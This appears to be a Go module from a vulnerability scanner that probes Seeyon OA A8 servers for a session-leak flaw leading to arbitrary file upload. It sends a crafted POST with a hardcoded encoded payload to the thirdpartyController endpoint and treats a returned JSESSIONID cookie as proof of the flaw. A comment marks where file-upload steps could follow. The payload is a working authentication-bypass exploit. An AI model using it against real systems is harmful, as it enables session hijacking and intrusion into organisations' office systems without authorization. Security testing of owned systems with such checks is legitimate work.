package A8_Session_fileupload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/seeyon/thirdpartyController.do"
	data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBody(data).Post(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA Session泄露 任意文件上传漏洞不存在")
		return
	}

	if resp.StatusCode == 200 && strings.Contains(resp.String(), "a8genius.do") && strings.Contains(strings.ToLower(resp.Header.Get("Set-Cookie")), "jsessionid") {
		color.Green.Println("[+] 目标 " + url + " 致远OA Session泄露 任意文件上传漏洞存在")
		// 更多操作，如文件上传等，可以在这里继续实现
	} else {
		color.Red.Println("[-]	致远OA Session泄露 任意文件上传漏洞不存在")
	}
}
